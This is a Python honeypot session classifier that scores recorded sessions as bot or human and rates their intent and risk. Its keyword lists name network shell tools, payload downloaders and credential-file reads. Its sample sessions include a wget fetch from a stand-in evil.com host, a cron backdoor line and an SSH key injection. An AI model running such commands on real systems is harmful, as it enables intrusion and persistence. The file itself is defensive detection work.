#!/usr/bin/env python3
"""
MORPH - Rule-Based Session Classifier

Classifies honeypot sessions by type (bot/human), intent, and risk level.
"""

from typing import Any

# Pattern definitions
RECON_COMMANDS = [
    "whoami", "uname", "ifconfig", "ip addr", "ip a", "ls", "cat /etc/passwd",
    "cat /etc/shadow", "id", "hostname", "pwd", "env", "printenv", "ps", "netstat",
    "ss", "df", "free", "uptime", "w", "last", "history", "cat /proc/cpuinfo",
]

EXPLOIT_COMMANDS = [
    "wget", "curl", "chmod +x", "chmod 777", "chmod 755", "./", "python -c",
    "python3 -c", "perl -e", "bash -c", "sh -c", "/tmp/", "base64 -d",
    "nc ", "netcat", "ncat", "tftp", "ftp ",
]

PERSISTENCE_COMMANDS = [
    "crontab", "~/.bashrc", ".bashrc", ".profile", "adduser", "useradd",
    "ssh-keygen", "authorized_keys", ".ssh/", "passwd", "sudoers",
    "/etc/init.d", "systemctl enable", "rc.local", "chkconfig",
]

SCANNER_PATTERNS = [
    "nmap", "masscan", "zmap", "nikto", "sqlmap", "hydra", "medusa",
    "gobuster", "dirb", "dirbuster", "wpscan", "nuclei",
]

BOT_COMMAND_SEQUENCES = [
    ["uname -a", "cat /proc/cpuinfo"],
    ["cd /tmp", "wget"],
    ["cd /tmp", "curl"],
    ["chmod +x", "./"],
]


def _command_contains(commands: list[str], patterns: list[str]) -> list[str]:
    """Return list of patterns found in any command."""
    matched = []
    for pattern in patterns:
        for cmd in commands:
            if pattern.lower() in cmd.lower():
                matched.append(pattern)
                break
    return matched


def _check_sequence(commands: list[str], sequence: list[str]) -> bool:
    """Check if commands contain a sequence in order."""
    if not sequence or not commands:
        return False
    seq_idx = 0
    for cmd in commands:
        if sequence[seq_idx].lower() in cmd.lower():
            seq_idx += 1
            if seq_idx >= len(sequence):
                return True
    return False


def classify_session(session: dict[str, Any]) -> dict[str, Any]:
    """
    Classify a honeypot session based on behavior patterns.

    Args:
        session: Dict with keys: commands, login_attempts, downloads, duration_seconds

    Returns:
        Dict with keys:
        - type: "bot" or "human"
        - intent: "recon", "exploit", or "persistence"
        - risk: "low", "medium", or "high"
        - matched_rules: list of triggered rule names
    """
    commands = session.get("commands", [])
    login_attempts = session.get("login_attempts", [])
    downloads = session.get("downloads", [])
    duration = session.get("duration_seconds", 0)

    matched_rules: list[str] = []
    
    # Scoring accumulators
    bot_score = 0
    human_score = 0
    recon_score = 0
    exploit_score = 0
    persistence_score = 0

    # === TYPE CLASSIFICATION (bot vs human) ===

    # Check for rapid commands (bot indicator)
    if commands and duration > 0:
        commands_per_second = len(commands) / max(duration, 1)
        if commands_per_second > 2:
            bot_score += 3
            matched_rules.append("rapid_commands")
        elif commands_per_second > 0.5:
            bot_score += 1
            matched_rules.append("moderate_command_rate")

    # Check for repeated login attempts (bot indicator)
    if len(login_attempts) > 5:
        bot_score += 2
        matched_rules.append("repeated_login_attempts")
    if len(login_attempts) > 20:
        bot_score += 2
        matched_rules.append("brute_force_login")

    # Check for duplicate credentials (bot indicator)
    if login_attempts:
        creds = [(a.get("username"), a.get("password")) for a in login_attempts]
        unique_creds = set(creds)
        if len(creds) > len(unique_creds) * 1.5:
            bot_score += 1
            matched_rules.append("duplicate_credentials")

    # Check for scanner patterns (bot indicator)
    scanner_matches = _command_contains(commands, SCANNER_PATTERNS)
    if scanner_matches:
        bot_score += 3
        matched_rules.append(f"scanner_patterns:{','.join(scanner_matches)}")

    # Check for bot command sequences
    for seq in BOT_COMMAND_SEQUENCES:
        if _check_sequence(commands, seq):
            bot_score += 2
            matched_rules.append(f"bot_sequence:{seq[0]}...")
            break

    # Human indicators
    if duration > 60 and commands:
        commands_per_minute = len(commands) / (duration / 60)
        if commands_per_minute < 5:
            human_score += 2
            matched_rules.append("slow_interaction")

    # Varied commands suggest human
    if commands:
        unique_ratio = len(set(commands)) / len(commands)
        if unique_ratio > 0.8 and len(commands) > 3:
            human_score += 2
            matched_rules.append("varied_commands")
        elif unique_ratio < 0.3 and len(commands) > 5:
            bot_score += 1
            matched_rules.append("repetitive_commands")

    # Exploratory behavior (cd, ls combinations)
    cd_count = sum(1 for c in commands if c.strip().startswith("cd "))
    ls_count = sum(1 for c in commands if "ls" in c.lower())
    if cd_count > 2 and ls_count > 2:
        human_score += 1
        matched_rules.append("exploratory_behavior")

    # === INTENT CLASSIFICATION ===

    # Check for recon commands
    recon_matches = _command_contains(commands, RECON_COMMANDS)
    if recon_matches:
        recon_score += len(recon_matches)
        matched_rules.append(f"recon_commands:{','.join(recon_matches[:3])}")

    # Check for exploit commands
    exploit_matches = _command_contains(commands, EXPLOIT_COMMANDS)
    if exploit_matches:
        exploit_score += len(exploit_matches) * 2
        matched_rules.append(f"exploit_commands:{','.join(exploit_matches[:3])}")

    # Check for persistence commands
    persistence_matches = _command_contains(commands, PERSISTENCE_COMMANDS)
    if persistence_matches:
        persistence_score += len(persistence_matches) * 3
        matched_rules.append(f"persistence_commands:{','.join(persistence_matches[:3])}")

    # Downloads boost exploit score
    if downloads:
        exploit_score += len(downloads) * 2
        matched_rules.append(f"downloads:{len(downloads)}")

    # === RISK CLASSIFICATION ===

    risk_score = 0

    # Downloads are risky
    if downloads:
        risk_score += 2
        matched_rules.append("has_downloads")

    # Execution attempts
    execution_patterns = ["./", "python -c", "perl -e", "bash -c", "sh -c", "chmod +x"]
    exec_matches = _command_contains(commands, execution_patterns)
    if exec_matches:
        risk_score += 2
        matched_rules.append("execution_attempts")

    # Download + execution = very risky
    if downloads and exec_matches:
        risk_score += 2
        matched_rules.append("download_and_execute")

    # Persistence is high risk
    if persistence_matches:
        risk_score += 3
        matched_rules.append("persistence_risk")

    # Credential harvesting
    shadow_access = any("/etc/shadow" in c for c in commands)
    if shadow_access:
        risk_score += 2
        matched_rules.append("shadow_access")

    # Privilege escalation attempts
    priv_esc = any(p in " ".join(commands).lower() for p in ["sudo", "su -", "su root"])
    if priv_esc:
        risk_score += 1
        matched_rules.append("privilege_escalation")

    # === DETERMINE FINAL CLASSIFICATIONS ===

    # Type
    session_type = "bot" if bot_score > human_score else "human"
    
    # Intent (highest score wins)
    intent_scores = {
        "recon": recon_score,
        "exploit": exploit_score,
        "persistence": persistence_score,
    }
    intent = max(intent_scores, key=intent_scores.get)  # type: ignore
    
    # Default to recon if no clear intent
    if all(s == 0 for s in intent_scores.values()):
        intent = "recon"

    # Risk level
    if risk_score >= 5:
        risk = "high"
    elif risk_score >= 2:
        risk = "medium"
    else:
        risk = "low"

    return {
        "type": session_type,
        "intent": intent,
        "risk": risk,
        "matched_rules": matched_rules,
    }


if __name__ == "__main__":
    # Example usage with test sessions
    test_sessions = [
        {
            "name": "Bot Scanner",
            "commands": ["uname -a", "cat /proc/cpuinfo", "cd /tmp", "wget http://evil.com/bot"],
            "login_attempts": [{"username": "root", "password": "123456"}] * 25,
            "downloads": ["http://evil.com/bot"],
            "duration_seconds": 5,
        },
        {
            "name": "Human Explorer",
            "commands": ["ls", "cd /home", "ls -la", "cat readme.txt", "cd ..", "pwd", "whoami"],
            "login_attempts": [{"username": "admin", "password": "admin123"}],
            "downloads": [],
            "duration_seconds": 180,
        },
        {
            "name": "Persistence Attacker",
            "commands": ["whoami", "crontab -e", "echo '* * * * * /tmp/backdoor' >> /var/spool/cron/root", 
                        "cat ~/.ssh/authorized_keys", "echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys"],
            "login_attempts": [{"username": "root", "password": "toor"}],
            "downloads": [],
            "duration_seconds": 45,
        },
    ]

    print("MORPH Session Classifier - Test Results")
    print("=" * 60)

    for session in test_sessions:
        result = classify_session(session)
        print(f"\n{session['name']}:")
        print(f"  Type: {result['type']}")
        print(f"  Intent: {result['intent']}")
        print(f"  Risk: {result['risk']}")
        print(f"  Matched rules:")
        for rule in result["matched_rules"]:
            print(f"    - {rule}")
